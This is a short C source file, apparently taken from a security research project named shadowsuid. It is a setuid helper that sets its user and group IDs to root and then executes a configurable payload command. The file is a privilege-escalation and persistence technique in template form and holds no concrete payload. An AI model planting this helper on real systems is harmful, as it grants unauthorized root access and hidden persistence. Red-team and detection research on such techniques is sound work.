//from: https://github.com/Sentinel-One/shadowsuid !
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char * argv[], char * envp[])
{
    // please notice, on some OS's id is on /bin/
    char * my_args[] = { CUSTOM_PAYLOAD NULL };
    setuid(0);
    setgid(0);
    execve(my_args[0], my_args, 0);
}